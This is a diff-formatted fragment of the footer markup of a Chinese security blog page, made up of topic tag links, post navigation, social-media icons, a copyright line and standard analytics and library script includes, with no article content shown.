+          <a href="https://lcx.cc/tags/windows/">Windows</a>
+          <a href="https://lcx.cc/tags/%E5%AE%89%E5%85%A8/">安全</a>
+          <a href="https://lcx.cc/tags/%E6%9A%B4%E5%8A%9B/">暴力</a>
+          <a href="https://lcx.cc/tags/%E7%BC%96%E7%A0%81/">编码</a>
+          <a href="https://lcx.cc/tags/%E6%B5%8B%E8%AF%95/">测试</a>
+          <a href="https://lcx.cc/tags/%E6%9F%A5%E6%89%BE/">查找</a>
+          <a href="https://lcx.cc/tags/%E7%A8%8B%E5%BA%8F%E5%91%98/">程序员</a>
+          <a href="https://lcx.cc/tags/%E4%BB%A3%E7%A0%81/">代码</a>
+          <a href="https://lcx.cc/tags/%E6%81%B6%E6%84%8F/">恶意</a>
+          <a href="https://lcx.cc/tags/%E5%88%86%E6%9E%90/">分析</a>
+          <a href="https://lcx.cc/tags/%E5%B7%A5%E5%85%B7/">工具</a>
+          <a href="https://lcx.cc/tags/%E6%94%BB%E5%87%BB/">攻击</a>
+          <a href="https://lcx.cc/tags/%E5%87%BD%E6%95%B0/">函数</a>
+          <a href="https://lcx.cc/tags/%E8%A7%A3%E7%A0%81/">解码</a>
+          <a href="https://lcx.cc/tags/%E7%A0%B4%E8%A7%A3/">破解</a>
+          <a href="https://lcx.cc/tags/%E6%95%B0%E6%8D%AE/">数据</a>
+          <a href="https://lcx.cc/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a>
+          <a href="https://lcx.cc/tags/%E7%AE%97%E6%B3%95/">算法</a>
+          <a href="https://lcx.cc/tags/%E6%96%87%E4%BB%B6/">文件</a>
+          <a href="https://lcx.cc/tags/%E9%97%AE%E9%A2%98/">问题</a>
+          <a href="https://lcx.cc/tags/%E7%B3%BB%E7%BB%9F/">系统</a>
+          <a href="https://lcx.cc/tags/%E6%BA%A2%E5%87%BA/">溢出</a>
+          <a href="https://lcx.cc/tags/%E6%B3%A8%E5%B0%84/">注射</a>
+          <a href="https://lcx.cc/tags/%E5%AD%97%E5%85%B8/">字典</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/2601/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">Web的安全防御浅谈</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/2599/">
+            <span class="next-text nav-default">谷歌报告称印度成为要求网络删帖最多国家</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
+      title="email" >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="linkedin"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="33" height="33">
+  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="weibo"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="douban"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+
+  
+
+  <span class="copyright-year">
+    &copy;
+    
+      2010 -
+    2025
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        Nuclear'Atk（核攻击）网络安全实验室
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+<script id="baidu_push">
+  (function(){
+    if (window.location.hostname === 'localhost') return;
+    var bp = document.createElement('script'); bp.async = true;
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/my.js"></script>
+
+
+</body>
+</html>
